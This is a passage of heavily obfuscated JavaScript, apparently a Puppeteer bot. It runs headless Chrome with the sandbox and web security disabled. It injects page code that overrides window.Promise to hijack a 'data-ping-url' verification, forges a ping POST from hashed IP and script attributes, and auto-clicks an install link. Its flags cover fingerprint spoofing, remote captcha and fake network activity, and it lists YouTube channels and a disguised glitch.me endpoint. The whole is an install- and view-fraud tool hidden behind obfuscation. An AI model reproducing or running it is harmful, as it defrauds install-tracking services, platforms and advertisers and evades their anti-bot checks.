                J[-0x6 * 0x1ff + -0x12c5 + 0x21 * 0xef] = this['block'], J[K >> -0xa1 * 0x27 + 0x1879 * -0x1 + 0x3102] |= x[0x88 * -0x36 + -0x1e18 + 0x3acb & K], this['block'] = J[-0xf4e + 0x9c3 + 0x59b * 0x1], K >= 0x1 * -0xdc6 + -0x174 * 0xb + -0xefd * -0x2 && (this['hashed'] || this['hash'](), J[-0x13a * 0x1d + -0x16dc + -0x3 * -0x137a] = this['block'], J[-0x8c3 * -0x3 + 0x25e0 + -0x4019] = J[-0x1 * 0x1506 + 0x253b + 0x40d * -0x4] = J[0x7 * 0x377 + -0x1506 + -0x5 * 0xa5] = J[0x115b + -0x2625 + 0x47 * 0x4b] = J[-0x10e3 * 0x1 + 0x87 + 0x2 * 0x830] = J[-0x1 * 0x255e + 0xe07 + -0x1 * -0x175c] = J[-0x59 * -0x3d + -0x1 * -0x878 + -0x1da7] = J[-0x1 * 0xe47 + 0x22e3 + -0x1df * 0xb] = J[-0x1507 + -0x12ca + -0x27d9 * -0x1] = J[-0x593 + -0x5 * 0x3ab + 0x1 * 0x17f3] = J[-0x25b * 0xe + 0x26 * -0x104 + 0x479c] = J[0x1 * -0x1a87 + -0xc5a + -0x2 * -0x1376] = J[-0x1 * 0x2077 + 0x1b63 + -0x2 * -0x290] = J[-0x19a5 + 0x7e7 + 0x38f * 0x5] = J[-0x1fd3 + 0x1c67 + 0x1bd * 0x2] = J[0x1 * 0x2075 + 0x671 * 0x4 + -0x3a2a] = -0x1 * -0x21c2 + 0x97c + 0xf6 * -0x2d), J[-0x1 * -0x24fd + -0x1c71 + -0x2 * 0x43f] = this['hBytes'] << 0x1997 + -0x2 * 0x851 + -0x8f2 | this['bytes'] >>> -0x15fb + 0x4 * -0x408 + 0x2638 * 0x1, J[-0x8ad + -0x265e * -0x1 + -0x1 * 0x1da2] = this['bytes'] << 0x690 + 0x631 + -0x7 * 0x1d2, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x1 * 0x1351 + -0x9dc + -0x965; J < -0xafc + 0x1 * 0x1a95 + -0xf49; ++J)
                K = Q[J - (0x1572 + -0x1ede * 0x1 + -0x45 * -0x23)] ^ Q[J - (-0x34 * 0xa3 + 0xa7 * -0x1 + 0x21cb)] ^ Q[J - (-0x1ce5 + 0x178f * -0x1 + 0x2f * 0x11e)] ^ Q[J - (0x10c9 + -0xbe2 + 0x3b * -0x15)], Q[J] = K << -0x215e + -0x226 * -0xc + 0x797 | K >>> 0x2458 * -0x1 + 0x6c + 0x240b;
              for (J = -0x557 + -0x9b7 * 0x2 + -0x175 * -0x11; J < 0x1 * 0x805 + -0x1030 + 0x83f; J += 0x21a0 + 0x3b7 * -0x1 + 0xef2 * -0x2)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x3f2 * -0x1 + -0x1c1f + 0x6 * 0x559 | L >>> -0x1ef4 + 0x31a + 0x1a5 * 0x11) + (M & N | ~M & O) + P + (-0x52fc45b9 + -0x2 * 0x4e1c65f + 0xb7424c10) + Q[J] << -0x7 * 0x333 + 0x2 * 0xc73 + -0x281) << -0x2173 + -0x18e1 + 0x3a59 | P >>> -0x6cb * 0x2 + -0xfee + 0x1d9f) + (L & (M = M << 0x1 * 0x6f3 + -0xd4 * -0x18 + -0x1ab5 | M >>> -0xb53 + -0x966 + 0x14bb) | ~L & N) + O + (0x74fca2e4 + -0x91dc66a1 + -0x41ddece * -0x1d) + Q[J + (0x6d0 + -0x7fe + 0x3 * 0x65)] << 0x2253 + 0x25b1 + 0x4804 * -0x1) << -0x64c + -0x1934 + 0x1f85 * 0x1 | O >>> -0x991 + -0xc31 + -0xc1 * -0x1d) + (P & (L = L << 0x2637 * 0x1 + 0x1f87 * -0x1 + 0x3a * -0x1d | L >>> -0x1 * 0x2467 + -0x18e0 * 0x1 + 0x3d49) | ~P & M) + N + (0x6b5be72e * 0x1 + 0x5cc50adf + 0x8468c * -0xd3f) + Q[J + (-0x144b + -0x2 * 0x7b2 + 0x23b1)] << -0x70a * -0x3 + -0x775 + -0xda9) << -0x1bb6 + -0xb85 * -0x3 + -0x6d4 | N >>> 0x2286 + 0x48f * 0x5 + 0x3 * -0x1312) + (O & (P = P << 0xf17 * 0x1 + -0x231c + 0x1423 | P >>> 0xe * 0xee + 0x3f8 * 0x4 + -0xe71 * 0x2) | ~O & L) + M + (0x611f01 * 0x5c + 0x3151 * -0xde03 + -0x1f078 * -0x32ba) + Q[J + (-0xb27 + -0x19bc + 0x24e6 * 0x1)] << 0x8c5 + -0x58d * 0x7 + -0x1e16 * -0x1) << 0xb0d + 0xe79 + 0x1981 * -0x1 | M >>> 0x1e95 * 0x1 + -0x70f * 0x4 + -0x11f * 0x2) + (N & (O = O << -0x1da7 + -0xe6b * -0x2 + -0xef * -0x1 | O >>> -0x1e4 * 0x13 + -0x220b + 0x45f9) | ~N & P) + L + (-0x3d654177 + -0x2e386c1 * 0xd + 0xbd7592dd) + Q[J + (-0x20fa + -0x1bcd + -0x3ccb * -0x1)] << 0x7 * -0x1 + -0x13 * 0x73 + 0x890, N = N << -0xd74 + -0x286 + 0x1018 | N >>> 0x1698 + 0x5 * 0x7a0 + -0x3cb6;
              for (; J < 0x13eb * 0x1 + 0xa * 0x3bb + -0x827 * 0x7; J += 0x6b1 + -0x244d * 0x1 + -0x29 * -0xb9)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x176b + 0x2b * -0x6 + 0x1872 | L >>> -0x1fb5 + 0x641 * 0x1 + 0x885 * 0x3) + (M ^ N ^ O) + P + (0x241da * -0x87d + 0xbccb8d5f + 0x2 * -0x1d645526) + Q[J] << 0x871 + -0x11 * -0x18d + -0x22ce) << 0xd0 * -0x22 + 0x43 * 0x2 + 0x1b1f | P >>> -0x23c + 0x6 * 0x38e + -0x12fd) + (L ^ (M = M << -0x4db * 0x7 + 0x15d * 0xb + 0x131c * 0x1 | M >>> 0x17ed * -0x1 + -0x221b + -0x187 * -0x26) ^ N) + O + (0x90add2f6 + -0x5d1 * -0x18e9a1 + -0xb2bac8c6) + Q[J + (-0xaf7 * -0x3 + 0x6b * -0x35 + -0xabd)] << 0x1 * -0xd72 + 0x3 * -0x9d3 + 0x2aeb) << 0xefa + 0x743 * -0x4 + 0x1 * 0xe17 | O >>> 0xef6 + -0x1900 + 0xa25) + (P ^ (L = L << -0x14ae * 0x1 + 0x875 + 0xc57 | L >>> -0x2329 + -0x95 * -0x3e + -0xeb * 0x1) ^ M) + N + (0x3dff * 0x24ef9 + -0x34f * -0x5099b + 0x104f9e69 * -0x3) + Q[J + (0x6e + -0x1eba + 0xf27 * 0x2)] << -0x7 * 0x4ab + -0x216c + -0x1 * -0x4219) << 0x1 * -0xa51 + 0x14fd + -0xaa7 | N >>> 0x1344 + 0xf1b * -0x1 + -0x40e) + (O ^ (P = P << -0x76b + 0x1 * -0x209 + 0x992 | P >>> 0x2a9 * 0x2 + -0x37 * 0x37 + 0x5 * 0x14d) ^ L) + M + (-0x3bd7f2cb * 0x2 + -0x7fcf3ae9 + -0x718934 * -0x328) + Q[J + (-0x715 + -0x2244 + 0x295c)] << -0x624 + -0x571 * -0x7 + 0x1ff3 * -0x1) << 0x19 * 0x12d + 0x19b0 + -0x3710 | M >>> -0x62f * 0x1 + 0x23c + 0x40e) + (N ^ (O = O << 0x1b20 + 0xd51 * -0x1 + -0xdb1 | O >>> 0x1ab3 + 0x3c * 0x4f + 0xa3 * -0x47) ^ P) + L + (0xa8ef3155 + -0x33ec22d9 * 0x2 + 0x9a661 * 0x4be) + Q[J + (0x2503 + -0x1 * -0xb32 + -0x3031)] << 0x3df + -0xe9 * -0x10 + -0x625 * 0x3, N = N << 0x2543 + -0xcfd + -0xc14 * 0x2 | N >>> 0x141f + 0x68f * 0x1 + -0x2 * 0xd56;
              for (; J < -0xd46 * 0x1 + -0x1014 + 0xecb * 0x2; J += -0x9c * -0x22 + -0x753 + -0xd60)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1f5f + 0x83 * 0x3a + -0x49 * -0x6 | L >>> -0x1 * -0x1529 + 0x139 * -0x1 + -0x13d5) + (M & N | M & O | N & O) + P - (0x1c6dc * -0x6d88 + 0xfe27 * 0x84f7 + -0xaf804063 * -0x1) + Q[J] << -0x1 * 0x1a53 + 0xf5a + -0x1 * -0xaf9) << -0x8bf * 0x1 + 0xbcb * -0x2 + -0x102d * -0x2 | P >>> 0xe3f + -0xa * 0x3b1 + 0x16c6) + (L & (M = M << 0x1c05 + -0x1c6 + -0x1a21 | M >>> -0x2251 + -0x1e1a * -0x1 + 0x439) | L & N | M & N) + O - (-0x7f1626cf + 0x8e0cdb68 + 0x61ed8e8b) + Q[J + (0x122f + -0x1225 * -0x1 + -0x2453)] << 0x1 * -0x1a53 + -0x7f9 + 0x1126 * 0x2) << -0x5 * 0x483 + 0x2115 + -0xa81 | O >>> -0x4f1 * -0x4 + -0x1561 * -0x1 + -0x290a) + (P & (L = L << 0x47 + -0x149d + 0x2ec * 0x7 | L >>> -0x20aa + -0x1877 + 0x3923 * 0x1) | P & M | L & M) + N - (0x5fdd381a + 0x3934c3e2 + 0x14bcc28 * -0x1f) + Q[J + (0xef9 + -0xdfd * -0x1 + -0x1cf4)] << 0x4c * -0x14 + 0xf * 0x2b + -0x23 * -0x19) << -0xd2b + -0x177e + -0x5 * -0x756 | N >>> -0x2 * 0x907 + 0x3 * 0xcf7 + 0x1 * -0x14bc) + (O & (P = P << 0x53d + 0xdeb * 0x2 + -0x20f5 | P >>> 0xa32 + 0x734 * -0x5 + 0x19d4) | O & L | P & L) + M - (-0x738e0dd + -0xcdb59885 + 0xe * 0x1745e8e5) + Q[J + (-0x250b + -0xe * 0x269 + 0x46cc)] << -0xd87 + -0xc40 + 0x19c7) << -0x61 * -0x2a + -0x5eb + -0x9fa | M >>> -0x52d * -0x2 + -0x1b04 + -0x1dd * -0x9) + (N & (O = O << -0x7 * -0x551 + 0xb37 + -0x3050 | O >>> 0x2137 + -0x15f7 + -0xb3e) | N & P | O & P) + L - (0x2b439028 + 0x6315e3 * 0x220 + -0x8cedcf64) + Q[J + (-0x187 * 0x9 + 0x3 * 0x48f + 0x1 * 0x16)] << -0xd50 + -0x53 * -0x75 + -0x189f, N = N << -0x1fd * 0x1 + 0x19c0 + -0x17a5 | N >>> 0x1 * -0x1241 + -0x1265 + 0x24a8;
              for (; J < -0x1 * -0x12df + 0x1194 + -0x2423; J += 0x25cc * -0x1 + -0x9e4 + -0x2fb5 * -0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x11 * -0xae + 0x25 * -0x101 + 0x199c | L >>> -0x1 * -0x172 + 0x1aa4 + 0x1d * -0xf7) + (M ^ N ^ O) + P - (0x5ed917 * -0x11 + 0x28 * 0x275ecf0 + -0x26835ccf) + Q[J] << 0x3 * 0x8dd + -0x7 * 0x30e + 0x1f * -0x2b) << -0x51d + 0x2411 * 0x1 + -0x1eef * 0x1 | P >>> 0x19c8 + -0x428 + -0x1585) + (L ^ (M = M << -0x1e53 + 0x2317 + -0x4a6 | M >>> 0x1839 + -0x19d4 + 0x19d) ^ N) + O - (-0x152b * -0x4109f + -0x44698e85 + 0x23faf6fa) + Q[J + (-0x7fd + 0x1 * -0x872 + 0x1070)] << 0x4 * -0x3a5 + -0xa * -0x3c1 + 0x1 * -0x16f6) << -0x13a9 * -0x1 + -0x205e + 0xcba | O >>> 0xdc0 + -0x2b8 * -0xa + 0x28d5 * -0x1) + (P ^ (L = L << 0x79 * -0xd + -0x1500 + 0x1b43 | L >>> -0x2 * 0x616 + -0x13f * -0x4 + 0x6 * 0x133) ^ M) + N - (-0xa0 * -0x3384fb + -0xa96f1 * 0x3a2 + 0x13f62844 * 0x3) + Q[J + (0xb * -0x308 + -0x20f0 + -0xa * -0x6a1)] << -0x2036 + -0x11d7 + 0x3 * 0x10af) << 0xcaf * 0x1 + 0x5c6 + -0x1270 | N >>> 0x246d + -0xff4 * 0x2 + -0x46a) + (O ^ (P = P << 0x2558 + -0x3 * 0xb9 + -0x230f | P >>> -0x8ed + -0x239d + 0x1 * 0x2c8c) ^ L) + M - (0x4f36dbc6 + -0x1ffa3397 + 0x66095fb) + Q[J + (-0x136a + 0x1096 + 0x2d7)] << -0x21a8 + -0x1cc3 + 0x3e6b) << 0x17a2 + -0x77e * -0x5 + -0x35 * 0x127 | M >>> -0x185c * -0x1 + -0x28a + -0x15b7) + (N ^ (O = O << 0xfec + -0x2636 + 0x1668 | O >>> -0xd92 + -0x527 * 0x5 + 0x2757) ^ P) + L - (-0x5dcae7d2 + 0x2a68285a + -0x17dff * -0x465e) + Q[J + (0x230c + 0x1 * 0x2122 + 0x2ba * -0x19)] << -0x10f * -0xb + 0x71 * 0x4d + -0x2da2, N = N << -0x13b2 * 0x1 + 0xf * -0x146 + -0x11 * -0x24a | N >>> 0xaed + -0x6ec + -0x5d * 0xb;
              this['h0'] = this['h0'] + L << 0x17cc + 0x2064 + -0x8 * 0x706, this['h1'] = this['h1'] + M << 0xf69 + 0x141f + -0x2388, this['h2'] = this['h2'] + N << -0x1eb * 0x2 + 0xcf1 + 0x15 * -0x6f, this['h3'] = this['h3'] + O << -0x1908 + -0x1b96 + 0x349e, this['h4'] = this['h4'] + P << -0x371 * 0x6 + -0x10fc * 0x1 + 0x2 * 0x12d1;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x1ee7 + -0x23d4 + 0x42d7 & -0x1a9 + 0x2 * -0x48b + -0x3 * -0x39a] + w[J >> -0x9bc * -0x3 + -0x10b2 * -0x1 + -0x2dce & -0x10c + 0x247e + 0x2363 * -0x1] + w[J >> -0x1b * -0x102 + -0xc1 * -0x1 + 0x289 * -0xb & 0x8f0 + -0x1 * 0xda + -0x807] + w[J >> -0xd05 + 0x1 * -0x1929 + 0x3d3 * 0xa & 0x2015 + 0x2 * -0x1a + -0x1fd2] + w[J >> 0x56 * -0x53 + -0x5f6 + 0x21e4 & -0x187e + -0xb63 + 0x23f0] + w[J >> 0x17f3 + 0x3 * -0xc71 + -0x11e * -0xc & 0x21b0 + 0x1 * 0xb3c + -0x2cdd] + w[J >> -0x1 * 0x21a + 0x1a51 + -0x1833 & 0x1 * 0x256f + 0x7a9 * -0x2 + -0x160e] + w[-0x527 * 0x5 + 0x8 * 0x207 + 0x99a & J] + w[K >> -0x709 * -0x5 + 0x2693 + -0x3 * 0x188c & 0x1bab + 0x1b65 + -0x3701] + w[K >> -0x2072 + -0x35a + 0x23e4 & -0x11e7 * 0x1 + 0x5c0 + 0xc36] + w[K >> 0x521 * 0x1 + -0xa * -0x156 + 0x1269 * -0x1 & 0xd * 0x265 + -0x15bb * -0x1 + -0x34cd] + w[K >> -0x138d + 0x4 * 0x59e + -0x2db & 0x1b65 * 0x1 + 0x15fb + -0x3151] + w[K >> 0x1cef + -0x41d * -0x3 + 0x6df * -0x6 & -0x1b84 + -0x1efd * -0x1 + 0x13 * -0x2e] + w[K >> 0x1352 * -0x2 + 0x9 * -0x335 + 0x4389 & 0x5 * -0x213 + 0x13fb + -0x98d] + w[K >> -0x2222 + 0x1148 + -0x7f * -0x22 & 0x1 * 0x25f1 + -0x6f5 + 0xd * -0x261] + w[0x221 + 0x1 * 0xd4f + -0xf61 & K] + w[L >> 0x1b76 + -0x16c5 + -0x495 & 0x1 * -0x751 + 0x4 * -0x395 + 0x15b4] + w[L >> -0x2 * -0x378 + 0x18 * 0x166 + -0x2868 & -0x1c62 + -0xe05 + 0x2a76] + w[L >> 0x1000 * -0x1 + 0x12 * -0x15d + -0x6 * -0x6c5 & -0x29c * 0xa + -0x7e4 + 0x220b * 0x1] + w[L >> -0x3 * 0x2a5 + 0xfa0 + -0x7a1 & 0x1432 + 0x1db5 + -0xdc * 0x3a] + w[L >> -0xb85 + -0x1040 * -0x2 + -0x14ef & 0x100e + 0x4d4 + -0x14d3] + w[L >> -0x3 * 0x7 + -0x1e0 * 0x10 + 0x1 * 0x1e1d & -0x3b0 + -0xc4c * -0x1 + 0x88d * -0x1] + w[L >> -0x1490 + -0x252 + 0x16e6 & 0x1de * -0xd + -0x2221 * -0x1 + 0x2 * -0x4e6] + w[0x7b2 * 0x2 + -0xcd * -0x2c + 0x3291 * -0x1 & L] + w[M >> 0xa10 + -0xd9d * 0x1 + 0x3a9 & -0x2507 * -0x1 + 0x2493 * 0x1 + 0x119 * -0x43] + w[M >> -0x2438 + -0xb2 * -0x6 + 0x2024 & 0xa7 * 0x5 + -0x16ae + 0x33f * 0x6] + w[M >> -0xb7 * -0x7 + 0x79 * -0x39 + 0x1604 * 0x1 & 0xee * 0x11 + -0x4 * 0x7a1 + -0x13 * -0xc7] + w[M >> 0x782 * -0x2 + 0x1 * 0xbfb + 0x319 & 0x1617 + -0xa75 + -0xb93] + w[M >> 0x982 + 0xda6 + -0x171c & -0x32 * 0x8e + -0x837 * 0x3 + 0x3470] + w[M >> 0x445 * -0x7 + 0x23e3 + -0x5f8 & -0x2208 + 0x1043 + 0x11d4] + w[M >> -0x227e + 0x35 * 0x55 + 0x10e9 & 0x1 * -0x2637 + 0x2112 + 0x534] + w[-0x28b * 0x9 + 0x58c + -0x1 * -0x1166 & M] + w[N >> -0x2 * 0x644 + 0x2a * 0x19 + 0x88a & 0x974 + 0x10e4 + 0x1a49 * -0x1] + w[N >> 0xc89 + 0x1ae6 + -0x1 * 0x2757 & -0x22c4 + -0x3 * -0x9bb + 0x5a2] + w[N >> 0x1d7 * 0x1 + 0xb55 * -0x2 + -0x1 * -0x14e7 & 0x2299 + -0x189b * 0x1 + 0x1 * -0x9ef] + w[N >> -0x1fbd + 0x1d95 * -0x1 + 0x61 * 0xa2 & 0x5bf + -0x12dc + -0x4 * -0x34b] + w[N >> 0x140a + 0x270 * -0xa + 0x11 * 0x42 & 0x722 + -0x3e1 * 0x8 + 0x17f5] + w[N >> -0x501 + -0x2064 + 0x256d & -0xe * 0x1af + 0x715 + 0x6 * 0x2c2] + w[N >> 0x2253 * -0x1 + -0x1753 + 0x53e * 0xb & 0xd * -0x166 + -0x1e4f + 0x3bc * 0xd] + w[-0x9 * 0x2f5 + -0x1a2d * -0x1 + 0x7f * 0x1 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0xae3 + 0x1 * 0xf9e + -0x4a3 & -0x541 * -0x1 + 0x1a0 * -0x9 + 0x1 * 0xa5e,
                J >> -0x7 * 0x3be + -0xe5d * -0x1 + 0x69 * 0x1d & 0x26ee + 0x1 * -0xc46 + -0x1 * 0x19a9,
                J >> -0x1fbc + 0xdf3 + 0x11d1 & -0x12d9 * -0x1 + 0x13db + -0x25b5,
                0xf3c + -0x840 + -0x5fd & J,
                K >> -0x4f0 + 0xa13 + 0x50b * -0x1 & 0x1b8f + 0xf00 + -0x2990,
                K >> -0xea4 + 0x78a + 0x72a & -0x1 * -0x13af + 0x1fda + 0x328a * -0x1,
                K >> -0x23c0 * 0x1 + 0xd47 + 0x1681 * 0x1 & -0x1c79 + 0x186d + 0x50b,
                -0x1ca3 + 0xe7 * 0x23 + -0x1 * 0x1f3 & K,
                L >> -0x23 * 0x26 + -0xe59 + 0x13a3 & 0x1d4d + 0x1778 + -0x33c6,
                L >> 0x31f * 0x2 + -0x308 + -0x1a * 0x1f & 0x31a * -0x3 + 0x1af4 + 0x58d * -0x3,
                L >> 0x125 * -0x17 + -0x42a + 0x1e85 * 0x1 & 0x5 * -0x7d + 0x2 * 0xb85 + -0x139a,
                0x7ab + -0xce4 + 0x18e * 0x4 & L,
                M >> -0xe9 + -0x772 * -0x2 + -0xde3 & 0x6 * 0x271 + -0x158d + 0x3f3 * 0x2,
                M >> 0x1 * -0x908 + -0x6e * 0x1d + 0x1f * 0xb2 & -0x5f3 * 0x4 + -0x91c + -0xb4d * -0x3,
                M >> 0x1 * -0xca1 + -0x26da + 0x3383 & -0x79c + -0x1 * 0x851 + 0xe4 * 0x13,
                0x138a + -0x224e * -0x1 + 0x34d9 * -0x1 & M,
                N >> 0xe * -0x165 + -0x2629 * -0x1 + 0x65 * -0x2f & 0xfdb + 0x1 * 0x431 + 0x1 * -0x130d,
                N >> -0x25 * -0x7a + -0x13b * -0x15 + -0x2b69 * 0x1 & -0x1b1f + 0xc * -0x17d + 0x2dfa,
                N >> 0x116a + 0xe7 * 0x15 + 0x83 * -0x47 & 0xc7e + 0x3a * -0xd + -0x88d * 0x1,
                0x1 * -0x64 + -0xc77 * -0x2 + 0x93 * -0x29 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x115 + 0x3 * 0x653 + -0x11d0), (K = new DataView(J))['setUint32'](0x16fd + 0x2708 + -0x3e05, this['h0']), K['setUint32'](0x2ba * 0xb + -0x102 * -0x3 + -0x2100, this['h1']), K['setUint32'](-0x1e1d * 0x1 + 0xfdd + 0xe48, this['h2']), K['setUint32'](-0xdf3 + -0x26dd + 0x34dc, this['h3']), K['setUint32'](0x57 * -0x53 + -0xea2 + 0x2ae7, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x397 * 0x3 + 0x609 + -0x4 * -0x12f];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x19 * 0xc5 + -0xbcd * -0x3 + -0x36a4;
            J[-0x2011 + -0x1a9e + 0x3aaf]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x81 + -0x47 * 0x9 + -0x8 * -0x60] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x1 * 0x588 + 0x3 * -0x3bc + 0x5ad * 0x1), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x175d * 0x1 + -0x1ac7 + -0x1 * -0x36b;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x5ef * -0x5 + -0x15bc + -0x213), Promise['resolve'](0x1e29 * 0x1 + -0x210e + 0x2e6);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x4 * 0x5e7 + -0x42a * 0x3 + 0x241a; j < 0x26 * 0x8b + 0x1d61 + 0x15a * -0x25; j++)
    i();
}
const NETWORK_PATIENCE = -0xd1a + -0x1443 + 0x409d + (-0xcf5 * 0x1 + 0x7 * -0x500 + 0x3bad) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0xc04 + 0x1380 * 0x1 + -0x779) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require(W(0x1a)),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + W(0x0),
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x5e0 + -0x1c0c + 0x162c; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0xd * -0x29 + 0x20b7 + -0x1ea2);
    let h = e[f];
    if (b['JkvkBV'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x15 * 0x15f + -0x773 + -0x1558, s, t, u = 0xc2f + 0x825 + -0xa2a * 0x2; t = n['charAt'](u++); ~t && (s = r % (0x4 * 0x2ce + 0x1341 + -0x1e75) ? s * (-0x38 + 0x64d + -0x5d5) + t : t, r++ % (0x7c5 * -0x1 + -0x7db + 0x11e * 0xe)) ? p += String['fromCharCode'](0x4 * 0x819 + 0x1 * 0x19e0 + 0x1b * -0x21f & s >> (-(0x26b5 + 0x1261 + -0x3914) * r & 0x275 * -0x4 + -0xe59 + 0x3b * 0x69)) : -0x8 * 0x4b2 + 0x1090 + -0xe0 * -0x18) {
          t = o['indexOf'](t);
        }
        for (let v = -0x584 + 0x2bd * -0x4 + 0x20f * 0x8, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0xc4d + -0x231c + 0xfd3 * 0x3))['slice'](-(-0x3 * -0x53d + -0x271 * -0xe + -0x31e3));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x6d2 + 0x1ebd + -0x17eb,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x1e20 + 0x1ec3 + -0xa3 * 0x1; u < 0xb4f + -0x3 * -0xa97 + -0x2a14; u++) {
          p[u] = u;
        }
        for (u = 0x2547 + 0x220d + -0x4754; u < 0x20a2 + 0x115f + 0xc1 * -0x41; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x2586 * -0x1 + -0x1122 + -0x1364), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x17e1 + 0x9 * -0x2a1 + 0x2f8a, q = -0x18 * -0x18d + -0xe33 + -0x1705;
        for (let v = -0x1f3a + -0x1 * -0x1c2d + 0xb * 0x47; v < n['length']; v++) {
          u = (u + (0xa1d + 0x2d * -0xbf + 0x1 * 0x1777)) % (-0x1c * -0xf2 + -0x156d + -0x40b), q = (q + p[u]) % (-0x65 * 0x3b + 0x1d11 + -0x4ca), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x22d * -0xf + -0x472 + -0x1b31)]);
        }
        return t;
      };
      b['btDEzJ'] = m, c = arguments, b['JkvkBV'] = !![];
    }
    const j = e[0xb9 * 0x1 + 0x1299 + -0x1352],
      k = f + j,
      l = c[k];
    return !l ? (b['hraTtx'] === undefined && (b['hraTtx'] = !![]), h = b['btDEzJ'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
